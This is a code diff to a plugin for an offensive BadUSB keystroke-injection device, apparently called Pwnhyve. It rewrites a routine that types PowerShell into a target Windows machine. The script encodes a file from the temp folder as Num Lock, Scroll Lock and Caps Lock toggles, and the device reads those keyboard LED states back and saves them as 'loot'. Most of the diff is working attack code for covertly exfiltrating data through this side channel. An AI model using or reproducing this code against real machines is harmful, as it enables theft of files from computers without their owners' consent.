@@ -1,6 +1,7 @@
+import time
 from PIL import ImageFont
-from time import sleep
 from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
+from core.badusb.keyreflect import KeyReflectionSocket
 import os
 from core.plugin import BasePwnhyvePlugin
 
@@ -26,7 +27,7 @@ class Plugin(BasePwnhyvePlugin):
         global usb
 
         if usb == None:
-            a = tpil.gui.screenConsole(tpil)
+            a = tpil.gui.screenConsole()
 
             a.setText("USB is not connected\n\n...")
 
@@ -36,68 +37,42 @@ class Plugin(BasePwnhyvePlugin):
 
             return
 
-        handler = tpil.gui.usbRunPercentage(tpil) # init handler
+        handler = tpil.gui.screenConsole() # init handler
 
-        handler.addText("hit any key to run payload\nexfiltrating: $env:tmp/z")
+        handler.addText("hit any key to execute\nexfiltrating: %tmp%/z")
 
         tpil.waitForKey(debounce=True)
 
+        kr = KeyReflectionSocket(createUSB=usb)
+
         usb.run("powershell")
-        sleep(0.125)
-        usb.write(';'.join([
-            "foreach($b in $(cat $env:tmp\z -En by)){$bin = [System.Convert]::ToString($b, 2);if ($bin.Length -ne 8) {$bin = '0' * (8 - $bin.Length % 8) + $bin} foreach($v in $bin.toCharArray()) { if($v -eq '1'){$o+='%{CAPSLOCK}{SCROLLLOCK}%{CAPSLOCK}'}else{$o+='{SCROLLLOCK}'} }}",
-            "Add-Type -A System.Windows.Forms",
-            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')",
-            "[System.Windows.Forms.SendKeys]::SendWait($o)",
-            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')"
-            "rm $env:tmp\z"
-        ]))
-
-        databinary = ""
-        cl = 0
-
-        while not usb.numLock:
-            sleep(0.025)
-
-        while True:
-            if usb.scrollLock:
-
-                cl = 0
-
-                if usb.capsLock:
-                    databinary += "1"
-                else:
-                    databinary += "0"
-
-                while usb.scrollLock:
-                    sleep(1/(2048*1.5)) # wait for clock to be over
-
-    
-            else:
-                cl += 1
-
-                if cl == 1500:
-                    print("cl reached max")
-                    break
-
-                sleep(1/(2048*1.5))
-
-        zb = []
-        d = ""
-        for x in databinary:
-            d += x
-            if len(d) == 8:
-                zb.append(d)
-                d = ""
+        time.sleep(1.25)
+        usb.write("""Add-Type -AssemblyName System.Windows.Forms
+$o='';$n=$false;$s=$false;$c=$false
+gc "$env:TEMP\z" -enc byte|%{
+$b=[convert]::ToString($_,2).PadLeft(8,'0')
+for($i=0;$i-lt8;$i+=2){
+ $nb=($b[$i]-eq'1');if($n-ne$nb){$o+='{NUMLOCK}';$n=!$n}
+ $sb=($b[$i+1]-eq'1');if($s-ne$sb){$o+='{SCROLLLOCK}';$s=!$s}
+ $o+='{CAPSLOCK}{CAPSLOCK}';$c=!$c
+}};[System.Windows.Forms.SendKeys]::SendWait($o)""")
+        
+        usb.press("ENTER")
             
-        print(zb)
+        while True:
+            handler.addText("recieved: {} bytes".format(len(kr.byteBuffer)))
+            
+            if len(kr.recvBuffer) > 0 and len(kr.byteBuffer) == 0:
+                handler.addText("done")
+                break
+
+            time.sleep(0.5)
 
         with open("loot.bin", "wb") as f:
-            byte_sequence = bytes([int(seq, 2) for seq in zb])
-
-            f.write(byte_sequence)
+            f.write(kr.recv())
             f.flush()
 
+        tpil.waitForKey()
         handler.exit()
 
     def Ducky_Payloads(tpil):
@@ -105,7 +80,7 @@ class Plugin(BasePwnhyvePlugin):
         # args: [draw, disp, image]
 
         if usb == None:
-            a = tpil.gui.screenConsole(tpil)
+            a = tpil.gui.screenConsole()
 
             a.setText("USB is not connected\n\n...")
 
@@ -121,7 +96,7 @@ class Plugin(BasePwnhyvePlugin):
 
         vars.payloadList["back"] = '0'
 
-        sleep(0.5)
+        time.sleep(0.5)
 
         a = tpil.gui.menu(payloads)
 
@@ -146,7 +121,7 @@ class Plugin(BasePwnhyvePlugin):
         directory = basedir
 
         if usb == None:
-            a = tpil.gui.screenConsole(tpil)
+            a = tpil.gui.screenConsole()
 
             a.setText("USB is not connected\n\n...")
 
